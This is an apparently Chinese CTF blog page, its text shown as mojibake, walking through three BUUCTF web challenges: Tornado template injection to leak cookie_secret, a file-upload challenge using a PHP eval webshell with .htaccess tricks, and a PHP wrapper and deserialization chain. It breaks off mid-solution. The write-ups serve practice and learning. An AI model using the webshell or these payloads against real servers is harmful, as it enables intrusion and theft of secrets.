<meta property="og:image" content="http://example.com/images/395D0C10155740ceBB6309AC7D96DDC1.png">
<meta property="og:image" content="http://example.com/images/D5F774D3C3B54f31895C86EEC33ACD87.png">
<meta property="og:image" content="http://example.com/images/DC50DBF7CED349ac8E10BDB40CC53E96.png">
<meta property="og:image" content="http://example.com/images/251250150BDA4b88AF294AEB1C1B80ED.png">
<meta property="og:image" content="http://example.com/images/FF0F9B418D7E4eb7ADF528F15FEAE10D.png">
<meta property="og:image" content="http://example.com/images/81815F7490084ee289012E710D1DA539.png">
<meta property="og:image" content="http://example.com/images/5CB659C4FF1D452288D9E0EE60CFC5E5.png">
<meta property="og:image" content="http://example.com/images/B1F50110F98D43ddAAC362EB6CC4EDFE.png">
<meta property="og:image" content="http://example.com/images/06F8D62AE11C4d32A11A397D4B278B34.png">
<meta property="og:image" content="http://example.com/images/1CC4B5A965F8419c99F6F03620BBB576.png">
<meta property="og:image" content="http://example.com/images/2CAC52B611214c51A1536E7E77C0C19F.png">
<meta property="og:image" content="http://example.com/images/554051CD0A7742f19B4D30F99825DD91.png">
<meta property="og:image" content="http://example.com/images/D6DE42843F044a4fABE9F77181C247BF.png">
<meta property="og:image" content="http://example.com/images/28DCF2F6363C4d8a81D178C649B0FF91.png">
<meta property="og:image" content="http://example.com/images/ED32879844344a6f83A8215334496EA3.png">
<meta property="og:image" content="http://example.com/images/8546C70DBD82478dA964ADFBC67556C4.png">
<meta property="og:image" content="http://example.com/images/4A2117B4B784427082E78CEA98CFD4FC.png">
<meta property="og:image" content="http://example.com/images/6846416A39CC4aea908BCAC145997748.png">
<meta property="og:image" content="http://example.com/images/9CCAFF648B8A4c50805D05687CF5A2F7.png">
<meta property="og:image" content="http://example.com/images/D6CB2DBB23DC4b458FD2AD853C6C7FDC.png">
<meta property="og:image" content="http://example.com/images/6772E1B0EC1549c4ABF74D13DCC94062.png">
<meta property="og:image" content="http://example.com/images/E9557FBEE74B428f9A3C80EAF2AE792C.png">
<meta property="og:image" content="http://example.com/images/04C366AE5B5F43908D4449A029E965A4.png">
<meta property="og:image" content="http://example.com/images/C19D81C0EE214c5dBEA86E2EFBA4AD04.png">
<meta property="og:image" content="http://example.com/images/DA04F3C07BA94df6B6419D4B06D8C0E5.png">
<meta property="og:image" content="http://example.com/images/3DA0E481B463490598C7C62F0476AFAA.png">
<meta property="og:image" content="http://example.com/images/5E8B6A2B84874d5aB96D9C08D5A14DCE.png">
<meta property="og:image" content="http://example.com/images/1C405726F5864566869EAEE0A90C739F.png">
<meta property="og:image" content="http://example.com/images/DA85CFA3CC984288BE37C16381C0C16A.png">
<meta property="og:image" content="http://example.com/images/2CF1C9ADAA194de4983AB14648960461.png">
<meta property="og:image" content="http://example.com/images/CBCE1EEE41844d31AAD77BE074166FF6.png">
<meta property="og:image" content="http://example.com/images/C2CD59FD343F419f8C6158AB4F7E32A8.png">
<meta property="og:image" content="http://example.com/images/18C386A2669542c6BC3E6158FF1F4C5F.png">
<meta property="article:published_time" content="2023-12-19T16:00:00.000Z">
<meta property="article:modified_time" content="2024-09-10T13:18:38.971Z">
<meta property="article:author" content="å¥‡æ€ªçš„å¥‡æ€ª">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/images/0AYQ%25Q.png">
  
  
  
  <title>buuctf_web - å¥‡æ€ªçš„äºšç´¢</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>å¥‡æ€ªçš„äºšç´¢</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="buuctf_web"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-12-20 00:00" pubdate>
          2023å¹´12æœˆ20æ—¥ å‡Œæ™¨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          203k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1689 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">buuctf_web</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado-1"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado-1" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado 1"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado 1</h2><p>è¿›å…¥ç­”é¢˜é¡µé¢ï¼Œå‘ç°ä¸‰ä¸ªè¶…é“¾æ¥<br>åˆ†åˆ«ç‚¹å‡»è¿›å»<br>å†ç‚¹å‡»è¿›å»åurlä¸­ä¼ è¾“äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯filenameï¼Œå¦ä¸€ä¸ªæ˜¯filehashï¼Œåœ¨ç¬¬ä¸€ä¸ªflag.txtä¸­æŠŠfilenameæ”¹ä¸ºæç¤ºçš„&#x2F;fllllllllllllagè¯•è¯•<br><img src="/images/0AYQ%25Q.png" srcset="/img/loading.gif" lazyload><br>æäº¤åé¡µé¢æ˜¾ç¤ºerror<br><img src="/images/0C.png" srcset="/img/loading.gif" lazyload><br>çœ‹æ¥æ‹¿åˆ°flagçš„å…³é”®å°±åœ¨äºè§£å‡ºfilehashæ˜¯ä»€ä¹ˆï¼Œæ ¹æ®ç¬¬ä¸‰ä¸ªè¶…é“¾æ¥çš„æç¤ºï¼Œåº”è¯¥æ˜¯filehash&#x3D;md5(cookie_secret+md5(filename))ï¼Œfilenameç°å·²çŸ¥ï¼Œä½†cookie_secretæ˜¯ä»€ä¹ˆå‘¢ï¼Œè€Œä¸”ç¬¬äºŒä¸ªranderä¹Ÿæ²¡æœ‰ç”¨åˆ°ï¼Œä¹Ÿå¹¶ä¸æ¸…æ¥šæœ‰ä»€ä¹ˆç”¨ï¼Œåªèƒ½å»æŸ¥ä¸€ä¸‹tornadoæ¡†æ¶æœ‰ä»€ä¹ˆç‰¹ç‚¹äº†<br><a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/">tornadoæ¡†æ¶çš„ä»‹ç»</a><br><img src="/images/17dc88e290814aba95813a751925fb5f.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ‘ä»¬åœ¨è¿™ä¸ªæ–‡æ¡£é‡Œé¢å¯ä»¥çŸ¥é“cookie_secretå¹¶ä¸åƒæˆ‘ä»¬çš„cookieä¸€æ ·å¯ä»¥è‡ªå·±ä¿®æ”¹çš„(ä¸æ˜¯è‡ªå·±çš„cookie)ï¼Œè€Œæ˜¯åŒ…å«äº†æ—¶é—´æˆ³ï¼ŒHMACç­¾åå’Œç¼–ç åçš„cookieå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±ä¿®æ”¹cookieå¹¶ä¸ç°å®ã€‚<br>æƒ³åˆ°renderä¼šä¸ä¼šæ˜¯cookie_secretçš„çªç ´ç‚¹ï¼Œæ‰¾ä¸€ä¸‹renderä½œç”¨</p>
<p>renderæ„ä¸ºæ¸²æŸ“;self.render(â€œentry.htmlâ€,entry&#x3D;entry)è¯¥è¯­å¥æ„æ€å°±æ˜¯æ‰¾åˆ°entry.htmlè¿™ä¸ªæ¨¡æ¿ï¼Œç”¨å³è¾¹è¿™ä¸ªentryæ¥å®ä¾‹åŒ–entry.htmlæ¨¡æ¿ä¸­çš„entryå‚æ•°ï¼Œä»è€Œæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚</p>
<p>å›è¿‡å¤´å‘ç°flag.txté‚£ä¸ªErrorçš„é¡µé¢æœ‰ä¸€ä¸ªå‚æ•°msgä¹Ÿæ˜¯ç­‰äºError<br><img src="/images/ZMS.png" srcset="/img/loading.gif" lazyload><br>å‘ç°msgå¯ä»¥å·¦å³é¡µé¢çš„è¾“å‡ºï¼Œæƒ³åˆ°ä¹‹å‰æœ‰äº›é¢˜ç›®åˆ©ç”¨ä¸€ä¸ªå‚æ•°å¯ä»¥å‡ºæ¥phpinfo()ç­‰ï¼Œå› æ­¤ç°åœ¨ç›®æ ‡å°±æ˜¯æ€ä¹ˆåˆ©ç”¨msgè¿™ä¸ªå‚æ•°æ¥æ‰¾åˆ°cookie_secretäº†<br><img src="/images/5334f6e91090438aaa0ac22c05c26768.png" srcset="/img/loading.gif" lazyload><br>åœ¨æ–‡æ¡£ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›¸å…³renderæ¸²æŸ“çš„ä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>&#123;&#123;&#125;&#125;</code> æ¥æŠŠè¡¨è¾¾å¼ä¼ è¿›å»ä»¥è·å–æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œè¿™æ ·æˆ‘ä»¬çŒœæƒ³<code>msg=&#123;&#123;cookieçš„ä½ç½®&#125;&#125;</code>æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„<br><img src="/images/d2702883750b44daaabc93abd5f3255a.png" srcset="/img/loading.gif" lazyload><br>cookie_secretåœ¨Applicationå¯¹è±¡settingsçš„å±æ€§ä¸­ï¼Œè®¿é—®å®ƒçš„è¯å°±éœ€è¦çŸ¥é“å®ƒçš„å±æ€§åå­—ï¼Œæ ¹æ®æŸ¥é˜…å¯çŸ¥ï¼šself.application.settingsæœ‰ä¸€ä¸ªåˆ«åæ˜¯RequestHandler.settingså…¶ä¸­handleråˆæ˜¯æŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡<br>RequestHandler.settingsæŒ‡å‘self.application.settings<br>å› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settings<br><img src="/images/Q2I.png" srcset="/img/loading.gif" lazyload><br>å°†handler.settingå¸¦å…¥msgå³å¯çŸ¥é“cookie_secretï¼Œå†æ¥ä¸€æ­¥æ­¥æ ¹æ®MD5æ¥è®¡ç®—filehash</p>
<p><img src="/images/HQC2E6.png" srcset="/img/loading.gif" lazyload><br>å›åˆ°hints.txt<br>ç°åœ¨å·²ç»çŸ¥é“äº†cookie_secretçš„å€¼ï¼ŒMD5(filename)å°±æ˜¯&#x2F;fllllllllllllagçš„MD5çš„å€¼<br>&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>æŠŠcookie_secretå’ŒMD5(filename)åŠ èµ·æ¥å†è¿›è¡ŒMD5åŠ å¯†å³å¯å¾—å‡ºflag<br><img src="/images/DJ.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢-1"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢-1" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ 1"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ 1</h2><p>è¿™é¢˜æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ é¢˜ï¼ŒæŒ‰ç…§è€æ–¹æ³•å…ˆä¸Šä¼ ä¸€ä¸ªæœ¨é©¬1.png å†…å®¹ï¼š<code>&lt;?php evel($_POST[&#39;a&#39;]);?&gt;</code><br>å†ä¸Šä¼ ä¸€ä¸ª.user.iniï¼šå†…å®¹ä¸º<code>auto_prepend_file=1.png</code> ä¸Šä¼ ä¹‹åä»–ä¼šç»™ä¸€ä¸ªè¿æ¥ï¼Œè¿›å…¥&#x2F;uploadä¹‹åçš„è¿æ¥ï¼Œç”¨èšå‰‘è¿æ¥ä¹Ÿä¸èƒ½æˆåŠŸè¿æ¥ï¼Œä¹Ÿå†™ä¸äº†å‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªæœ‰æ¢ä¸€ç§æ–¹æ³•äº†ã€‚</p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ª1.pngæ–‡ä»¶<br>å†…å®¹ä¸ºï¼š<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>å†ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œ<br>å†…å®¹ä¸ºï¼š<code>SetHandler application/x-httpd-php</code></p>
<h3 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h3><p>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯ç•Œé¢ã€æ”¹å˜æ–‡ä»¶æ‹“å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½<br>è¿™é‡Œhtaccesså†…å®¹çš„æ„æ€æ˜¯è®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨phpè§£æ</p>
<p>è¿™é‡Œè¦è®°å¾—æŠŠContent-Typeçš„å†…å®¹ä¿®æ”¹ä¸€ä¸‹<br><img src="/images/Y7CUL3CBL.png" srcset="/img/loading.gif" lazyload><br>å¤åˆ¶&#x2F;uploadä¹‹åçš„urlå¹¶è¿›å…¥</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>:http://c59ecfdc-<span class="hljs-number">0</span>a3d-<span class="hljs-number">4</span>ed6-<span class="hljs-number">92</span>d7-<span class="hljs-number">74</span>b6bcc602d4.node4.buuoj.cn:<span class="hljs-number">81</span>/upload/<span class="hljs-number">7</span>a439cdf1a27a4860163c7641f0dc7fe/<span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥postè¾“å…¥å‘½ä»¤</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>print_r(glob(<span class="hljs-string">&quot;/*&quot;</span>))<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>ä»¥è·å–flag</p>
<p>æˆ–ä»¥å½“å‰urlè¿æ¥ä¸­å›½èšå‰‘ï¼Œä»¥è·å–flag</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€æ®µæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œéƒ½éœ€è¦é€šè¿‡GETæ–¹å¼ä¼ å…¥<br>issetçš„ä½œç”¨æ˜¯æ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”énull<br>file_get_contentsçš„ä½œç”¨æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²<br>è¿™é‡Œå°†textæ–‡ä»¶ä¸­è¯»å–å­—ç¬¦ä¸²ï¼Œè¿˜è¦å’Œwelcome to the zjctfç›¸ç­‰<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯data:&#x2F;&#x2F;å†™å…¥åè®®<br>payloadï¼š</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure>

<p><img src="/images/DKORO.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>)</span></span><br></code></pre></td></tr></table></figure>

<p>æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¯´æ˜fileä¸èƒ½å‡ºç°flagå­—ç¬¦<br>ä½†æ˜¯æºç æç¤ºäº†useless.phpè¿™é‡Œä½¿ç”¨phpä¼ªåè®®æ¥è¯»å–æ–‡ä»¶</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure>
<p><img src="/images/G3HD33.png" srcset="/img/loading.gif" lazyload></p>
<p>ä½¿ç”¨base64è§£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ€åä¼šechoè¾“å‡ºfile<br>å°†flag.phpçš„å€¼ç»™äº†fileï¼Œç„¶åååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨phpç¼–è¯‘å™¨phpstorm<br><img src="/images/TMK81DK.png" srcset="/img/loading.gif" lazyload><br>payload:</p>
